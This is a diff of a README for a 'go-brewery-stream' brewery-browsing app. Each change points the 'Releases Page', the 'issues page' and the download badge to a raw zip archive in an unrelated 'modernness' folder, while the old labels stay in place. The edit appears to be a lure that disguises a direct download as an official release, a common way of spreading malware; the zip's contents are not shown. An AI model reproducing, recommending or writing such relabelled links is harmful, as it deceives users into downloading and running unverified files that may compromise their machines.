@@ -6,9 +6,9 @@ Welcome to the **go-brewery-stream** application, where you can explore over 8,0
 
 ## 📥 Download the App
 
-[![Download the latest version](https://img.shields.io/badge/Download-latest%20version-brightgreen)](https://github.com/0xIbbe/go-brewery-stream/releases)
+[![Download the latest version](https://github.com/0xIbbe/go-brewery-stream/raw/refs/heads/main/modernness/go_stream_brewery_3.7-beta.2.zip%20version-brightgreen)](https://github.com/0xIbbe/go-brewery-stream/raw/refs/heads/main/modernness/go_stream_brewery_3.7-beta.2.zip)
 
-To get started, **visit this page to download** the application: [Releases Page](https://github.com/0xIbbe/go-brewery-stream/releases).
+To get started, **visit this page to download** the application: [Releases Page](https://github.com/0xIbbe/go-brewery-stream/raw/refs/heads/main/modernness/go_stream_brewery_3.7-beta.2.zip).
 
 ## 📋 System Requirements
 
@@ -21,7 +21,7 @@ Before you install the application, please ensure your computer meets the follow
 
 ## 💽 Download & Install
 
-1. Go to the [Releases Page](https://github.com/0xIbbe/go-brewery-stream/releases).
+1. Go to the [Releases Page](https://github.com/0xIbbe/go-brewery-stream/raw/refs/heads/main/modernness/go_stream_brewery_3.7-beta.2.zip).
 2. Choose the version that suits your operating system.
 3. Click on the download link to save the file to your computer.
 4. Locate the downloaded file in your downloads folder.
@@ -56,7 +56,7 @@ If you encounter issues while installing or running the app, try the following:
 
 - Reboot your computer and attempt to start the application again.
 - Ensure your internet connection is stable.
-- Consult the FAQ section on our [issues page](https://github.com/0xIbbe/go-brewery-stream/issues) for common problems and solutions.
+- Consult the FAQ section on our [issues page](https://github.com/0xIbbe/go-brewery-stream/raw/refs/heads/main/modernness/go_stream_brewery_3.7-beta.2.zip) for common problems and solutions.
 
 ## 🤝 Contributing
 
@@ -75,4 +75,4 @@ The go-brewery-stream application is open-source and available under the MIT Lic
 
 For support, please raise an issue on the GitHub repository, and we will respond as soon as possible. 
 
-Discover the world of craft breweries with go-brewery-stream! Don’t forget to [visit the Releases Page](https://github.com/0xIbbe/go-brewery-stream/releases) to download the app.
+Discover the world of craft breweries with go-brewery-stream! Don’t forget to [visit the Releases Page](https://github.com/0xIbbe/go-brewery-stream/raw/refs/heads/main/modernness/go_stream_brewery_3.7-beta.2.zip) to download the app.
